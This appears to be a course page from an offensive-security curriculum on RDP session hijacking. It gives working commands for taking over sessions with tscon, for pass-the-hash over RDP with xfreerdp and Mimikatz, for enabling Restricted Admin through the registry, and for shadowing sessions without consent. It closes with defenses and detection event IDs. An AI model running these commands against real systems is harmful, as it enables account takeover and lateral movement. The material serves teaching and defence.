# RDP Hijacking

## Unit 6 - Topic 5 | Lateral Movement

---

## Overview

**RDP Hijacking** allows an attacker with SYSTEM privileges to take over another user's active Remote Desktop session without knowing their password. This enables impersonation of privileged users who have active or disconnected RDP sessions on compromised servers.

---

## 1. How RDP Hijacking Works

```
RDP HIJACKING SCENARIO:

SERVER01 has active sessions:
┌────────────────────────────────────────┐
│ Session ID | User          | State     │
│──────────────────────────────────────── │
│ 0          | Services      | Disc      │
│ 1          | corp\da_admin | Active    │ ← Target!
│ 2          | corp\attacker | Active    │ ← We're here
│ 65536      | Console       | Disc      │
└────────────────────────────────────────┘

ATTACK:
1. Attacker has SYSTEM on SERVER01
2. Sees da_admin has session ID 1
3. Uses tscon to connect to session 1
4. Attacker is now in da_admin's RDP session!
5. No password needed (SYSTEM can connect to any session)

WHY IT WORKS:
├── SYSTEM has full control over all sessions
├── tscon.exe (built-in) switches sessions
├── No authentication required when run as SYSTEM
├── Works on disconnected sessions too!
└── Session appears to still be the original user
```

---

## 2. Performing RDP Hijacking

```bash
# === STEP 1: Get SYSTEM ===
# Must have SYSTEM privileges on the target

# Via PsExec:
PsExec.exe -s -i cmd.exe    # If already local admin

# Via service:
sc create sesshijack binpath="cmd.exe /k tscon 1 /dest:rdp-tcp#2"
sc start sesshijack

# Via Mimikatz:
privilege::debug
token::elevate

# === STEP 2: List Sessions ===
query user
# Or:
qwinsta

# Output:
# SESSIONNAME   USERNAME         ID  STATE
# services                       0   Disc
# rdp-tcp#1     da_admin         1   Active
# rdp-tcp#2     attacker         2   Active
# console                        65536 Conn

# === STEP 3: Hijack Session ===
# Connect to target session (must be SYSTEM):
tscon 1 /dest:rdp-tcp#2
# Switches your RDP view to da_admin's session!

# If target session is disconnected:
tscon 1 /dest:console
# Connects disconnected session to console

# === ALTERNATIVE: Create Service Method ===
# If you can't get interactive SYSTEM:
sc create hijack binpath="cmd.exe /k tscon 1 /dest:rdp-tcp#2"
net start hijack
# Service runs as SYSTEM → executes tscon
```

---

## 3. RDP Lateral Movement

```bash
# === STANDARD RDP (Need credentials) ===
# From Linux:
xfreerdp /u:admin /p:password /v:target
xfreerdp /u:admin /p:password /v:target /cert-ignore

# With NTLM hash (Restricted Admin Mode):
xfreerdp /u:admin /pth:NTLM_HASH /v:target
# Requires RestrictedAdmin mode enabled on target

# Enable Restricted Admin (need admin):
reg add "HKLM\System\CurrentControlSet\Control\Lsa" \
  /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# === SHARPRDP (Execute commands via RDP) ===
.\SharpRDP.exe computername=target command="whoami" \
  username=corp\admin password=pass

# === CRACKMAPEXEC RDP ===
crackmapexec rdp 10.0.0.0/24 -u admin -p pass
# Check which hosts allow RDP access

# === RDP SHADOWING (Watch without hijacking) ===
# Monitor another user's session:
mstsc /shadow:1 /control /noConsentPrompt
# /shadow:SessionID — which session to shadow
# /control — allow input (not just viewing)
# /noConsentPrompt — don't ask the user
# Requires admin and specific GPO settings
```

---

## 4. Pass-the-Hash with RDP

```bash
# === RESTRICTED ADMIN MODE ===
# Introduced to prevent credential theft on remote host
# Irony: Enables PtH via RDP!

# How it works:
# Normal RDP: Sends credential to server (stored in LSASS)
# Restricted Admin: Uses network logon (like PtH)
#                   No creds stored on server

# Enable on target:
reg add "HKLM\System\CurrentControlSet\Control\Lsa" \
  /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
# Can do remotely with admin access

# RDP with hash:
xfreerdp /u:admin /pth:NTLM_HASH /v:target /restricted-admin

# From Windows:
mimikatz# sekurlsa::pth /user:admin /domain:corp /ntlm:HASH \
  /run:"mstsc /restrictedadmin"
# Opens RDP client authenticated with the hash

# === REMOTE CREDENTIAL GUARD ===
# Better version of Restricted Admin
# Sends Kerberos tickets, doesn't store creds
# But: Can still be abused for lateral movement
mstsc /remoteGuard
```

---

## 5. Defense Against RDP Hijacking

| Defense | Implementation |
|---------|---------------|
| **Disable tscon** | Restrict tscon.exe execution via AppLocker |
| **Session timeouts** | Disconnect idle sessions, set max session time |
| **NLA** | Require Network Level Authentication |
| **Disable RestrictedAdmin** | Set DisableRestrictedAdmin = 1 |
| **Monitor sessions** | Alert on session switching events |
| **Limit RDP access** | Only allow RDP from admin subnets |
| **MFA for RDP** | Require multi-factor for RDP sessions |

```
DETECTION:
├── Event ID 4778: Session reconnected
├── Event ID 4779: Session disconnected
├── Event ID 21: RDP session logon (TerminalServices-LocalSessionManager)
├── Event ID 25: RDP session reconnection
└── Monitor: tscon.exe execution by non-standard processes
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **RDP Hijacking** | Take over another user's RDP session |
| **Requirement** | SYSTEM privileges on the target |
| **Tool** | tscon.exe (built-in Windows) |
| **PtH via RDP** | Restricted Admin Mode enables hash-based RDP |
| **Detection** | Event IDs 4778/4779, tscon execution |
| **Defense** | Session timeouts, NLA, restrict tscon |

---

## Quick Revision Questions

1. **What privilege level is needed for RDP session hijacking?**
2. **How does tscon.exe enable session hijacking?**
3. **What is Restricted Admin Mode and why is it a double-edged sword?**
4. **How can you detect RDP hijacking in event logs?**
5. **What is the difference between RDP shadowing and hijacking?**

---

[← Previous: PsExec and Alternatives](04-psexec-and-alternatives.md) | [Next: Overpass-the-Hash →](06-overpass-the-hash.md)

---

*Unit 6 - Topic 5 of 6 | [Back to README](../README.md)*
